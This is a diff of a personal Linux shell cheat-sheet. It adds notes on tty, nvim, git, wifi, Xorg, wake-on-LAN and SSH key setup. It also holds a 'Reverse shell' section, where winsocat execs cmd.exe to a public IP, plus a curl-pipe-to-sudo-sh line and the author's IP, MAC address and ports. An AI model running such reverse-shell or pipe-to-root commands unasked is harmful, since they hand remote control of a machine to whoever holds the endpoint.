@@ -4,9 +4,22 @@ exit
 # nvim: implement screenkeys plugin using:	DONE
 # typer: implement linked lists with root	----
 # fix: screenkeys < displays as <lt>		DONE
+# fix: screenkeys: check how function on_key changes
+# fix: display script: xset from different user ----
+# i3-config-next: background doesn't revent to black
+#
+# Sequent Microsystems
+# fix 8mosind wiki? (it is 8mosfets wiki)
+
+
+#Fix nuphy function keys (apple compatibility) (TODO add to startup)
+echo -n 0 | sudo tee /sys/module/hid_apple/parameters/fnmode
 
 # Reproduce system
 curl https://3lv.github.io | sudo sh
+
+sudo ethtool enp1s0 | grep Wake
+wakeonlan -i 188.25.125.61 -p 64009 00:8c:fa:b2:f0:bb
 
 # tty commands
 # (most of these require sudo)
@@ -15,27 +28,29 @@ setterm --dump --file cazan.dump # copy of all characters on screen defaults to 
 # stop the screen when logged in in tty
 setterm --blank 1
 # for remote usage (with ssh)
-TERM=linux setterm --blank 1 >/dev/tty1 </dev/tty1
+sudo sh -c "TERM=linux setterm -blank 0 >/dev/tty1"
 # cat /dev/fb0 > fbdump.raw # framebuffer raw file (needs conversion)
 fbgrab screenshot.png # framebuffer to png
 tty # prints current tty or pseudo terminal
 chvt 2 # change to tty2
-fgconsole # (number of used vts, --next-available)
-deallocvc # get rid of ?unused vts
+fgconsole # (number of active tty, --next-available)
+# change brightness 255 max
+echo 255 | sudo tee /sys/class/backlight/amdgpu_bl1/brightness
 
 DISPLAY=:0 firefox # start firefox in active xsession
 
 # VIM {{{
-
 # :lua print(vim.inspect(vim.api.nvim_list_uis()))
+# :call chanclose(id)
 # :lua for _, ui in pairs(vim.api.nvim_list_uis()) do print(ui.chan .. ui.term_name) end
 # :lua for _, ui in pairs(vim.api.nvim_list_uis()) do if ui.chan and not ui.stdout_tty then vim.fn.chanclose(ui.chan) end end
-# :call chanclose(id)
 # nvim --server /tmp/nvim.pipe --remote-send "<c-\><c-n>:tc $PWD<cr>"
 # change server pipe
-# :call serverlist()
+# :echo serverlist()
 # :call serverstop(v:servername)
 # :call serverstart('/tmp/nvim.pipe')
+sudo find /run/user /tmp -user star -type s -name *nvim*
+ls /run/user/*/nvim.*.0 /tmp/nvim.* 2>/dev/null # not working (* is not expanding for not owned directories)
 
 # get this into muscle memory
 mK[chwin]mL'K[rewin]'L
@@ -193,8 +208,8 @@ git rm file # (-r for dir)
 git rm --cached file # (untrack file)
 git commit -m "commit message" 
 git push origin master
-# add extra staged files to commit
-git commit --amend
+# add extra staged files to commit (?change commit)
+git commit --amend --no-edit
 ## branches
 git branch # list all branches
 git branch branch_name # creates new branch
@@ -272,7 +287,8 @@ chown user:group file # ( -R rec )
 chmod o+x # ( others can execute u/g/o/a +/-/= r/w/x
 uname -a # (system information)
 ip addr show
-netstart # ( check for ports (run with sudo) -tulpn)
+# netstat -tulpn # ( check for ports (run with sudo))
+ss -tulpn
 mount # ( device mountpoint )
 sed '1,$ s/oldstring/newstring/nthoccurance(3g from third)' file # ( -n /p flag prints only matched lines, /d delete line, '3,5d' deletes lines in range, -r for regex)
 uptime
@@ -287,6 +303,7 @@ wget
 curl # (-i extra info, -d "first=Corey&last=Schafer" POST reauest, -X PUT/DELETE, -u user:pass, -o outputfile)
 netcat -l port > output.txt
 cat filetosend | netcat 192.168.0.49 port -q 0
+curl https://icanhazip.com # find network public ip
 nl # number lines
 cat -n filename # (-b nonblank lines)
 
@@ -306,6 +323,15 @@ sudo pacman -Syu
 sudo pacman -Sy archlinux-keyring
 sudo pacman-key --refresh-keys
 sudo pacman -Ssq "regex"
+grep upgraded /var/log/pacman.log # removed, installed
+# }}}
+
+# Reverse shell {{{
+# server size
+# For windows
+# stty raw -echo; (stty size; cat) | nc -lvnp 87
+winget -e --id Firejox.WinSocat
+C:\Users\crist\AppData\Local\Microsoft\WinGet\Packages\Firejox.WinSocat_Microsoft.Winget.Source_8wekyb3d8bbwe\winsocat.exe EXEC:C:\Windows\system32\cmd.exe TCP:188.25.125.61:64001
 # }}}
 
 # make
@@ -348,8 +374,13 @@ faillock --user vlad --reset
 
 # Wifi
 iwctl
-station wlan0 connect <"netowork name"> [security]
+station list
+station wlan0 scan
+station wlan0 get-networks
+station wlan0 connect <"netowork name">
+[security]
 
+# Xorg {{{
 # Keyboard
 # xmodmap to change keycodes
 xmodmap -pke # to find keycodes
@@ -370,12 +401,20 @@ xset r rate 200 50
 kbdrate [-d delay] [-r rate]
 # copy file content to clipboard
 cat file_name | xsel -ib
+# Querry
+xset -q # querry keyboard rate/powersave display
+xrandr | grep connected
+# }}}
 
 fdisk -l #list partition table
 fdisk # change partition table
 
 # format partition
 mkfs.exfat -n xd /dev/sda1 # best
+
+# check for mount options and change them
+mount | grep /dev
+mount -o remount,exec /dev
 
 free # to check ram/swap
 filefrag -v 'file' #show logical/physical_offset of extents of a file
@@ -417,8 +456,26 @@ i3-msg "[workspace=2] kill"
 # video background
 xwinwrap -ov -g 1920x1080 -- mpv -wid %WID --panscan=1.0 --no-audio --no-osc --no-osd-bar --no-input-default-bindings --loop ~/images/wallpapers/angel.gif
 
-# Windows{{{
-In powershell $Env:USERPROFILE is equiv to %USERPROFILE% for cmd
+# Wake on LAN
+# 1.enable it in bios
+# edit wol serive
+# sudo systemctl edit wol.service --full --force
+
+## Windows{{{
+# In powershell $Env:USERPROFILE is equiv to %USERPROFILE% for cmd
+#
+#
+# Configure ssh key login
+ssh-keygen
+notepad .ssh/config
+# Host cauldron
+# 	Hostname 188.25.125.61
+# 	Port 64002
+# 	User star
+type .ssh/id_rsa.pub | ssh cauldron "mkdir -p .ssh; cat >> .ssh/authorized_keys"
+ssh cauldron
+#
+#
 # }}}
 
 # vi:fdm=marker:ft=sh:
